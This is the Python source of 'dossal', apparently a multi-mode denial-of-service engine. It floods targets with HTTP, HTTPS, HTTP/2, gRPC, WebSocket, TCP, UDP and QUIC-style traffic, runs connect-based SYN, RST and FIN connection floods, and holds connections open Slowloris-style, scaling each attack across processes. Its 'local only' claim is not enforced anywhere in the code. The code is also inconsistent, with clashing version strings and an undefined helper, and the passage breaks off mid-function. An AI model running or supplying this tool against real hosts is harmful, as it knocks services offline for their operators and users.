#!/usr/bin/env python3
"""
dossal v0.6 — comprehensive DoS stress engine
Modes:
  http       : HTTP/1.1 keep-alive request flood (plain)
  https      : TLS request flood (HTTP/1.1, self-signed cert)
  websocket  : WebSocket upgrade flood
  tcp        : raw TCP byte flood
  udp        : raw UDP datagram flood
  h2         : HTTP/2 multiplexed request flood
  grpc       : gRPC (HTTP/2 + gRPC framing) request flood
  quic       : QUIC/HTTP3 UDP datagram flood (simulated Initial packets)
  syn        : TCP SYN flood (connect-only, no read)
  synack     : TCP connect + immediate close (ACK flood / connection exhaustion)
  rst        : TCP RST flood (connect → send RST via close)
  fin        : TCP FIN flood (graceful close after connect)
  slowloris  : Slow HTTP header drip (hold connections open)
  udy        : UDP datagram flood (alias for udp)
Targets are local only. JSON stats output. Multi-mode: --mode http,h2,udp
"""
import asyncio, ssl, socket, json, math, struct, random, time, argparse, signal, sys, base64, os, logging, threading
from urllib.parse import urlparse
logging.getLogger('asyncio').setLevel(logging.CRITICAL)
from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, DataReceived

VERSION = "3.16"

# ── TCP/IP checksum ──────────────────────────────────────────────
def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
    """Compute TCP header checksum (IPv4). Returns int."""
    ihl = 20  # no IP options
    ip_hdr = struct.pack("!4s4sBBHHHBBH4s4s",
        bytes([0]*4), bytes([0]*4),  # dummy IPs (loopback)
        0, 0, 0, 0, 64, 6, 0, src, dst)
    # Actually build proper pseudo-header
    pseudo = struct.pack("!4s4sBBHHHBBH",
        bytes([int(x) for x in src.split('.')]) if isinstance(src, str) else src,
        bytes([int(x) for x in dst.split('.')]) if isinstance(dst, str) else dst,
        0, 6, ihl + len(payload), 0, 0)
    tcp_hdr = struct.pack("!HHIIBBHHH",
        sport, dport, seq, ack,
        5 << 4, flags, 0, 0, 0)
    data = pseudo + tcp_hdr + payload
    if len(data) % 2:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

def _ip_checksum(ip_hdr):
    if len(ip_hdr) % 2:
        ip_hdr += b'\x00'
    s = 0
    for i in range(0, len(ip_hdr), 2):
        s += (ip_hdr[i] << 8) + ip_hdr[i+1]
    while s >> 16:
        s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

def _build_tcp_packet(src_ip, dst_ip, sport, dport, seq, ack, flags, payload=b""):
    """Build a complete IPv4+TCP packet. Returns bytes."""
    ip_id = random.randint(0, 65535)
    ip_totlen = 20 + 20 + len(payload)
    ip_hdr = struct.pack("!BBHHHBBH4s4s",
        0x45, 0, ip_totlen, ip_id, 0, 64, 6, 0,
        bytes([int(x) for x in src_ip.split('.')]),
        bytes([int(x) for x in dst_ip.split('.')]))
    cksum = _tcp_checksum(src_ip, dst_ip, sport, dport, seq, ack, flags, payload)
    tcp_hdr = struct.pack("!HHIIBBHHH",
        sport, dport, seq, ack,
        5 << 4, flags, 65535, 0, cksum)
    return ip_hdr + tcp_hdr + payload

# ── Stats ─────────────────────────────────────────────────────────
class Stats:
    def __init__(self):
        self.requests=0; self.bytes=0; self.errors=0; self.opens=0
        self.ws_msgs=0; self.packets=0; self.conns=0
    def rps(self, dur): return self.requests/dur if dur else 0
    def bps(self, dur): return self.bytes/dur if dur else 0
    def pps(self, dur): return self.packets/dur if dur else 0
    def report(self, modes, url, conns, dur):
        d = {
          "tool":"dossal","version":VERSION,"modes":modes,"url":url,
          "connections":conns,"duration_s":dur,
          "requests":self.requests,"rps":round(self.rps(dur),2),
          "bytes":self.bytes,"bps":round(self.bps(dur),2),
          "packets":self.packets,"pps":round(self.pps(dur),2),
          "connections_made":self.conns,
          "errors":self.errors
        }
        return d

# ── URL parsers ───────────────────────────────────────────────────
def parse_http(u):
    host, port = _host_port(u)
    p = urlparse(u)
    return host, port, p.path or "/"

def _host_port(u):
    """Extract (host, port) from any URL scheme. Robust to http/https/udp/tcp/etc."""
    if '://' not in u:
        parts = u.rsplit(':', 1)
        if len(parts) == 2:
            return parts[0], int(parts[1])
        return u, 80
    p = urlparse(u)
    port = p.port
    if port is None:
        # No port in URL: use scheme default
        port = 443 if p.scheme in ('https', 'wss') else 80
    return p.hostname or '127.0.0.1', int(port)

def parse_http(u):
    host, port = _host_port(u)
    p = urlparse(u)
    return host, port, p.path or '/'

def parse_tcp(u):
    return _host_port(u)

def parse_udp(u):
    return _host_port(u)

def parse_ip_port(u):
    return _host_port(u)

# ── HTTP response reader ──────────────────────────────────────────
async def _read_http_response(reader):
    header_data = b''
    while b'\r\n\r\n' not in header_data:
        try:
            chunk = await asyncio.wait_for(reader.read(1024), timeout=5.0)
        except asyncio.TimeoutError:
            return b''
        if not chunk:
            return b''
        header_data += chunk
    header_end = header_data.find(b'\r\n\r\n')
    headers_part = header_data[:header_end].decode('latin1')
    body_start = header_end + 4
    body = header_data[body_start:]
    for line in headers_part.split('\r\n'):
        if line.lower().startswith('content-length:'):
            content_length = int(line.split(':', 1)[1].strip())
            while len(body) < content_length:
                try:
                    chunk = await asyncio.wait_for(reader.read(8192), timeout=5.0)
                except asyncio.TimeoutError:
                    break
                if not chunk:
                    break
                body += chunk
            body = body[:content_length]
            break
    return header_data[:body_start] + body

# ═══════════════════════════════════════════════════════════════════
# WORKERS
# ═══════════════════════════════════════════════════════════════════

async def http_worker(name, url, stats, duration, stop, payload_size=0):
    host, port, path = parse_http(url)
    reader, writer = await asyncio.open_connection(host, port)
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
           f"User-Agent: dossal/{VERSION}\r\n\r\n")
    req_bytes = req.encode()

    while not stop.is_set():
        try:
            async def _write_read():
                writer.write(req_bytes)
                await writer.drain()
                return await _read_http_response(reader)
            resp = await asyncio.wait_for(_write_read(), timeout=10.0)
            if not resp:
                stats.errors += 1
                continue
            stats.requests += 1
            stats.bytes += len(resp)
        except (asyncio.TimeoutError, Exception):
            stats.errors += 1
            break
    if writer.transport:
        writer.transport.abort()

def _mp_https_flood(args_tuple):
    """Multi-process HTTPS flooder: TLS + HTTP in a child process."""
    import time as _time
    import ssl as _ssl
    import socket as _socket
    host, port, path, duration = args_tuple
    sent = 0
    errors = 0
    try:
        ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
        raw.settimeout(5.0)
        raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
        raw.connect((host, port))
        ssock = ctx.wrap_socket(raw, server_hostname=host)
        
        req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
               f"Connection: keep-alive\r\n"
               f"User-Agent: dossal/3.16\r\n\r\n").encode()
        
        end = _time.time() + duration
        while _time.time() < end:
            try:
                ssock.sendall(req)
                # Read one response (header + body)
                data = ssock.recv(65535)
                if not data:
                    break
                sent += 1
            except Exception:
                break
        try:
            ssock.close()
        except Exception:
            pass
    except Exception:
        errors += 1
    return sent, errors

async def https_mp_worker(name, url, stats, duration, stop, payload_size=0):
    """HTTPS multiprocess worker."""
    host, port, path = parse_http(url)
    n_procs = max(1, min(16, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, path, duration)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_https_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for sent, errs in results:
        stats.requests += sent
        stats.errors += errs
    stats.conns += n_procs

async def https_worker(name, url, stats, duration, stop, payload_size=0):
    host, port, path = parse_http(url)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    reader, writer = await asyncio.open_connection(host, port, ssl=ctx)
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
           f"User-Agent: dossal/{VERSION}\r\n\r\n")
    req_bytes = req.encode()
    while not stop.is_set():
        try:
            async def _write_read():
                writer.write(req_bytes)
                await writer.drain()
                return await _read_http_response(reader)
            resp = await asyncio.wait_for(_write_read(), timeout=10.0)
            if not resp:
                stats.errors += 1
                continue
            stats.requests += 1
            stats.bytes += len(resp)
        except (asyncio.TimeoutError, Exception):
            stats.errors += 1
            break
    if writer.transport:
        writer.transport.abort()

async def ws_worker(name, url, stats, duration, stop, payload_size=128):
    host, port, path = parse_ws(url)
    reader, writer = await asyncio.open_connection(host, port)
    key = base64.b64encode(random.randbytes(16)).decode()
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\n"
           f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
           f"Sec-WebSocket-Version: 13\r\n\r\n")
    writer.write(req.encode()); await writer.drain()
    handshake = await asyncio.wait_for(reader.read(8192), timeout=1.0)
    if b"101" not in handshake:
        stats.errors += 1
        writer.close(); return
    stats.conns += 1
    payload = b"x" * payload_size
    while not stop.is_set():
        try:
            mask = random.randbytes(4)
            masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
            header = struct.pack("!B", 0x81)
            if len(payload) < 126:
                header += struct.pack("!B", 0x80 | len(payload))
            else:
                header += struct.pack("!BH", 0x80 | 126, len(payload))
            header += mask
            writer.write(header + masked)
            stats.ws_msgs += 1
            stats.bytes += len(header) + len(masked)
        except Exception:
            stats.errors += 1
            break
    if writer.transport:
        writer.transport.close()
    try:
        await asyncio.wait_for(writer.wait_closed(), timeout=0.5)
    except Exception:
        pass

def _mp_tcp_flood(args_tuple):
    """Multi-process TCP byte flooder: connect, send repeatedly."""
    host, port, duration, payload_size = args_tuple
    import time as _time
    payload = b"A" * payload_size
    bytes_sent = 0
    pkts = 0
    errors = 0
    end = _time.time() + duration
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((host, port))
        while _time.time() < end:
            try:
                s.send(payload)
                bytes_sent += len(payload)
                pkts += 1
            except Exception:
                break
        s.close()
    except Exception:
        errors += 1
    return bytes_sent, pkts, errors

async def tcp_worker(name, url, stats, duration, stop, payload_size=1024):
    host, port = parse_tcp(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))  # TCP uses same proc count
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration, payload_size)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_tcp_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0, 0)] * n_procs
    stats.conns += n_procs
    for bytes_sent, pkts, errors in results:
        stats.bytes += bytes_sent
        stats.packets += pkts
        stats.errors += errors

_UDP_NPROCS = [4]  # mutable list to allow global override

def _mp_udp_send(args_tuple):
    """Multi-process UDP sender: runs in a child process."""
    host, port, duration, payload_size = args_tuple
    import time as _time
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    payload = b"B" * payload_size
    sent = 0
    end = _time.time() + duration
    while _time.time() < end:
        n = 2000
        try:
            for _ in range(n):
                sock.sendto(payload, (host, port))
            sent += n
        except Exception:
            break
    sock.close()
    return sent

async def udp_worker(name, url, stats, duration, stop, payload_size=1400):
    host, port = parse_udp(url)
    n_procs = _UDP_NPROCS[0]
    
    # Spawn N child processes
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration, payload_size)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_udp_send, targets)
    
    # Wait for completion
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    stats.packets += total
    stats.bytes += total * payload_size

async def h2_worker(name, url, stats, duration, stop, payload_size=1024):
    host, port, path = parse_http(url)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])
    reader, writer = await asyncio.open_connection(host, port, ssl=ctx)
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    writer.write(conn.data_to_send())
    await writer.drain()
    try:
        data = await asyncio.wait_for(reader.read(8192), timeout=2.0)
        conn.receive_data(data)
    except Exception:
        pass
    headers = [
        (':method', 'GET'),
        (':scheme', 'https'),
        (':authority', host),
        (':path', path),
        ('user-agent', f'dossal/{VERSION}'),
    ]
    # Batched h2: send N requests, then drain responses
    BATCH = 32
    error = None
    while not stop.is_set():
        try:
            for _ in range(BATCH):
                if stop.is_set():
                    break
                stream_id = conn.get_next_available_stream_id()
                conn.send_headers(stream_id, headers, end_stream=True)
            data = conn.data_to_send()
            if data:
                writer.write(data)
                await asyncio.wait_for(writer.drain(), timeout=5.0)
            stats.requests += BATCH
            # Drain available responses (non-blocking read)
            deadline = time.time() + 1.0
            while time.time() < deadline:
                try:
                    chunk = await asyncio.wait_for(reader.read(65535), timeout=0.05)
                except asyncio.TimeoutError:
                    break
                if not chunk:
                    break
                events = conn.receive_data(chunk)
                for event in events:
                    if isinstance(event, DataReceived):
                        stats.bytes += len(event.data)
        except Exception as e:
            stats.errors += 1
            error = e
            break
    if writer.transport:
        writer.transport.abort()

# ── gRPC worker: HTTP/2 + gRPC framing ──────────────────────────
def _mp_grpc_flood(args_tuple):
    """Multi-process gRPC flooder: TLS + h2 + gRPC frames in a child process."""
    import time as _time
    import ssl as _ssl
    import socket as _socket
    host, port, path, duration, payload_size = args_tuple
    from h2.connection import H2Connection
    from h2.config import H2Configuration
    from h2.events import DataReceived

    sent = 0
    errors = 0
    try:
        ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        ctx.set_alpn_protocols(['h2'])
        raw = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
        raw.settimeout(5.0)
        raw.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
        raw.connect((host, port))
        ssock = ctx.wrap_socket(raw, server_hostname=host)
        
        config = H2Configuration(client_side=True)
        conn = H2Connection(config=config)
        conn.initiate_connection()
        ssock.sendall(conn.data_to_send())
        # Read server preface
        data = ssock.recv(8192)
        conn.receive_data(data)
        
        headers = [
            (':method', 'POST'),
            (':scheme', 'https'),
            (':authority', host),
            (':path', path),
            ('content-type', 'application/grpc'),
            ('te', 'trailers'),
            ('user-agent', 'dossal/3.15'),
        ]
        grpc_payload = b'X' * max(1, payload_size)
        payload = b'\x00' + len(grpc_payload).to_bytes(4, 'big') + grpc_payload
        
        end = _time.time() + duration
        while _time.time() < end:
            try:
                stream_id = conn.get_next_available_stream_id()
                conn.send_headers(stream_id, headers, end_stream=False)
                conn.send_data(stream_id, payload, end_stream=True)
                data = conn.data_to_send()
                if data:
                    ssock.sendall(data)
                sent += 1
                # Drain responses
                try:
                    chunk = ssock.recv(65535)
                    if chunk:
                        conn.receive_data(chunk)
                except Exception:
                    pass
            except Exception:
                break
        ssock.close()
    except Exception:
        errors += 1
    return sent, errors

async def grpc_mp_worker(name, url, stats, duration, stop, payload_size=1024):
    """gRPC multiprocess worker."""
    host, port, path = parse_http(url)
    n_procs = max(1, min(16, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, path, duration, payload_size)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_grpc_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for sent, errs in results:
        stats.requests += sent
        stats.errors += errs
    stats.conns += n_procs

async def grpc_worker(name, url, stats, duration, stop, payload_size=1024):
    host, port, path = parse_http(url)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])
    reader, writer = await asyncio.open_connection(host, port, ssl=ctx)
    config = H2Configuration(client_side=True)
    conn = H2Connection(config=config)
    conn.initiate_connection()
    writer.write(conn.data_to_send())
    await writer.drain()
    try:
        data = await asyncio.wait_for(reader.read(8192), timeout=2.0)
        conn.receive_data(data)
    except Exception:
        pass
    
    # gRPC headers
    headers = [
        (':method', 'POST'),
        (':scheme', 'https'),
        (':authority', host),
        (':path', path),
        ('content-type', 'application/grpc'),
        ('te', 'trailers'),
        ('user-agent', f'dossal/{VERSION}'),
    ]
    # gRPC request frame: 1-byte flag + 4-byte length + payload
    grpc_payload = b'X' * max(1, payload_size)
    payload = b'\x00' + len(grpc_payload).to_bytes(4, 'big') + grpc_payload
    # Fire-and-forget: batch gRPC requests, drain in background
    reader_task = asyncio.create_task(_grpc_reader(conn, reader, stats))
    BATCH = 1
    error = None
    while not stop.is_set():
        try:
            for _ in range(BATCH):
                if stop.is_set():
                    break
                stream_id = conn.get_next_available_stream_id()
                conn.send_headers(stream_id, headers, end_stream=False)
                conn.send_data(stream_id, payload, end_stream=True)
            data = conn.data_to_send()
            if data:
                writer.write(data)
                await asyncio.wait_for(writer.drain(), timeout=5.0)
            stats.requests += BATCH
            stats.bytes += BATCH * len(payload)
        except Exception as e:
            stats.errors += 1
            error = e
            break
    reader_task.cancel()
    if writer.transport:
        writer.transport.abort()

async def _grpc_reader(conn, reader, stats):
    """Background reader: drain h2 frames to keep the connection alive."""
    try:
        while True:
            chunk = await reader.read(8192)
            if not chunk:
                break
            events = conn.receive_data(chunk)
            for event in events:
                if isinstance(event, DataReceived):
                    stats.bytes += len(event.data)
    except Exception:
        pass

# ── QUIC/HTTP3 worker: raw UDP with QUIC-like framing ───────────
def _mp_quic_send(args_tuple):
    """Multi-process QUIC sender: runs in a child process."""
    host, port, duration, payload_size = args_tuple
    import time as _time
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    payload = b'\xc0' + b'\x00' * 4 + b'\x00' * 8 + (b'X' * min(payload_size, 1200))
    sent = 0
    end = _time.time() + duration
    while _time.time() < end:
        n = 2000
        try:
            for _ in range(n):
                sock.sendto(payload, (host, port))
            sent += n
        except Exception:
            break
    sock.close()
    return sent

async def quic_worker(name, url, stats, duration, stop, payload_size=1400):
    host, port = parse_udp(url)
    n_procs = _UDP_NPROCS[0]
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration, payload_size)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_quic_send, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [0] * n_procs
    total = sum(results) if isinstance(results, list) else results
    plen = min(payload_size, 1200) + 13  # QUIC header + payload
    stats.packets += total
    stats.bytes += total * plen

# ── Raw HTTP: multiprocess raw socket (max RPS) ───────────────────
def _mp_http_send(args_tuple):
    """Multi-process raw socket HTTP sender (non-blocking select)."""
    import time as _time
    host, port, path, duration = args_tuple
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Connection: keep-alive\r\nUser-Agent: dossal/{VERSION}\r\n\r\n").encode()
    sent = 0
    errors = 0
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((host, port))
        end = _time.time() + duration
        while _time.time() < end:
            try:
                s.sendall(req)
                data = s.recv(65535)
                if not data:
                    break
                sent += 1
            except Exception:
                break
        s.close()
    except Exception:
        errors += 1
    return sent, errors

async def _wait_pool(pool, async_result, timeout):
    """Wait for a multiprocessing pool result using a dedicated executor."""
    loop = asyncio.get_event_loop()
    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=1) as ded:
        try:
            results = await loop.run_in_executor(ded, async_result.get, timeout)
        except Exception:
            results = None
    pool.close()
    try:
        await loop.run_in_executor(None, pool.join)
    except Exception:
        pass
    return results

async def raw_worker(name, url, stats, duration, stop, payload_size=0):
    """Raw HTTP multiprocess worker: max RPS via raw socket."""
    host, port, path = parse_http(url)
    n_procs = max(1, min(16, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, path, duration)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_http_send, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    
    for sent, errors in results:
        stats.requests += sent
        stats.errors += errors
    stats.conns += n_procs

# ── WebSocket multiprocess: raw socket WS frame flood ────────────
def _mp_ws_flood(args_tuple):
    """Multi-process WebSocket flooder: connect, upgrade, send frames."""
    import time as _time
    import struct as _struct
    import base64 as _b64
    import random as _rand
    host, port, path, duration, payload_size = args_tuple
    key = _b64.b64encode(_rand.randbytes(16)).decode()
    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
           f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n").encode()
    msgs = 0
    errors = 0
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((host, port))
        s.sendall(req)
        # Read handshake response
        resp = b""
        while b"\r\n\r\n" not in resp:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
        if b"101" not in resp:
            errors += 1
            s.close()
            return 0, errors
        # Build WS frame (text, masked)
        payload = b"x" * max(1, payload_size)
        plen = len(payload)
        if plen < 126:
            frame_header = b"\x81" + _struct.pack("!B", 0x80 | plen)
        else:
            frame_header = b"\x81" + _struct.pack("!BH", 0x80 | 126, plen)
        mask = _rand.randbytes(4)
        masked_payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        frame = frame_header + mask + masked_payload
        frame_size = len(frame)
        # Send frames in tight loop
        end = _time.time() + duration
        while _time.time() < end:
            try:
                s.send(frame)
                msgs += 1
            except Exception:
                break
        s.close()
    except Exception:
        errors += 1
    return msgs, errors

async def ws_mp_worker(name, url, stats, duration, stop, payload_size=128):
    """WebSocket multiprocess worker."""
    host, port, path = parse_ws(url)
    n_procs = max(1, min(16, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, path, duration, payload_size)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_ws_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    
    for msgs, errors in results:
        stats.ws_msgs += msgs
        stats.errors += errors
    stats.conns += n_procs

# ── SYN flood: connect only, never read ──────────────────────────
def _mp_syn_flood(args_tuple):
    """Multi-process SYN flooder: connect only (SYN)."""
    host, port, duration = args_tuple
    import time as _time
    conns = 0
    errors = 0
    end = _time.time() + duration
    while _time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)  # fast timeout
            s.connect((host, port))
            s.close()
            conns += 1
        except Exception:
            errors += 1
    return conns, errors

async def syn_worker(name, url, stats, duration, stop, payload_size=0):
    host, port = parse_ip_port(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_syn_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for conns, errs in results:
        stats.conns += conns
        stats.errors += errs

# ── SYN-ACK / connect+close (ACK flood) ──────────────────────────
def _mp_synack_flood(args_tuple):
    """Multi-process SYNACK/RST flooder."""
    host, port, duration = args_tuple
    import time as _time
    conns = 0
    errors = 0
    end = _time.time() + duration
    while _time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)  # fast timeout
            s.connect((host, port))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.close()  # RST
            conns += 1
        except Exception:
            errors += 1
    return conns, errors

async def synack_worker(name, url, stats, duration, stop, payload_size=0):
    host, port = parse_ip_port(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_synack_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for conns, errs in results:
        stats.conns += conns
        stats.errors += errs

# ── RST flood: SO_LINGER(0,0) close sends RST ───────────────────
def _open_rst_sock(host, port):
    """Open TCP conn; close() after send with unread data → RST (no SO_LINGER)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)  # fast timeout
    s.connect((host, port))
    return s

def _mp_rst_flood(args_tuple):
    """Multi-process RST flooder: connect, send, close (RST)."""
    host, port, duration, payload = args_tuple
    import time as _time
    conns = 0
    errors = 0
    end = _time.time() + duration
    while _time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)  # fast timeout for hot victims
            s.connect((host, port))
            s.send(payload)
            s.close()
            conns += 1
        except Exception:
            errors += 1
    return conns, errors

async def rst_worker(name, url, stats, duration, stop, payload_size=1):
    host, port = parse_ip_port(url)
    payload = b"X" * max(1, payload_size)
    n_procs = _UDP_NPROCS[0]
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration, payload)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_rst_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for conns, errs in results:
        stats.conns += conns
        stats.errors += errs

# ── FIN flood: connect → graceful close (FIN) ────────────────────
def _open_fin_sock(host, port):
    """Open a TCP connection, drain nothing, close gracefully (FIN)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)  # fast timeout
    s.connect((host, port))
    return s

def _mp_fin_flood(args_tuple):
    """Multi-process FIN flooder: connect, graceful close (FIN)."""
    host, port, duration = args_tuple
    import time as _time
    conns = 0
    errors = 0
    end = _time.time() + duration
    while _time.time() < end:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)  # fast timeout
            s.connect((host, port))
            s.close()  # graceful → FIN
            conns += 1
        except Exception:
            errors += 1
    return conns, errors

async def fin_worker(name, url, stats, duration, stop, payload_size=0):
    host, port = parse_ip_port(url)
    n_procs = max(1, min(8, _UDP_NPROCS[0]))
    
    import multiprocessing as mp
    ctx = mp.get_context('spawn')
    targets = [(host, port, duration)] * n_procs
    pool = ctx.Pool(n_procs)
    async_result = pool.map_async(_mp_fin_flood, targets)
    
    results = await _wait_pool(pool, async_result, duration + 15)
    if results is None:
        results = [(0, 0)] * n_procs
    for conns, errs in results:
        stats.conns += conns
        stats.errors += errs

# ── Slowloris: open connection, send partial headers slowly ──────
async def slowloris_worker(name, url, stats, duration, stop, payload_size=0):
    host, port, path = parse_http(url)
    try:
        reader, writer = await asyncio.open_connection(host, port)
        # Send first partial header line
        writer.write(f"GET {path} HTTP/1.1\r\nHost: {host}\r\n".encode())
        await writer.drain()
        stats.conns += 1
        # Keep alive with periodic headers
        header_count = 0
        while not stop.is_set():
            await asyncio.sleep(0.5)
            if not stop.is_set():
                writer.write(f"X-Header-{header_count}: slow\r\n".encode())
                await writer.drain()
                header_count += 1
                stats.bytes += 30
    except Exception:
        pass
    finally:
        if writer.transport:
            writer.transport.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass

# ── Mode registry ─────────────────────────────────────────────────
WORKERS = {
    "http":      http_worker,
    "https":     https_worker,
    "httpsmp":   https_mp_worker,
    "ws":        ws_worker,
    "websocket": ws_worker,
    "tcp":       tcp_worker,
    "udp":       udp_worker,
    "udy":       udp_worker,
    "h2":        h2_worker,
    "grpc":      grpc_worker,
    "grpcmp":    grpc_mp_worker,
    "quic":      quic_worker,
    "syn":       syn_worker,
    "synack":    synack_worker,
    "rst":       rst_worker,
    "fin":       fin_worker,
    'slowloris': slowloris_worker,
    'raw': raw_worker,
    'wsm': ws_mp_worker,
}

DEFAULT_PAYLOADS = {
    "http": 0, "https": 0, "websocket": 128, "tcp": 1024,
    "udp": 1400, "h2": 1024, "grpc": 1024, "quic": 1400, "syn": 0, "synack": 0,
    "rst": 1, "fin": 0, "slowloris": 0,
}

# ═══════════════════════════════════════════════════════════════════
# IMPACT SCORING
# ═══════════════════════════════════════════════════════════════════

async def _sample_process(pid, interval=0.5, duration=5):
    """Sample CPU% and memory of a process for `duration` seconds."""
    try:
        import psutil
        proc = psutil.Process(pid)
        samples = []
        deadline = time.time() + duration
        while time.time() < deadline:
            try:
                cpu = proc.cpu_percent(interval=None)
                mem = proc.memory_info().rss
                samples.append((cpu, mem))
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                break
            await asyncio.sleep(interval)
        if samples:
            avg_cpu = sum(c for c, _ in samples) / len(samples)
            max_mem = max(m for _, m in samples)
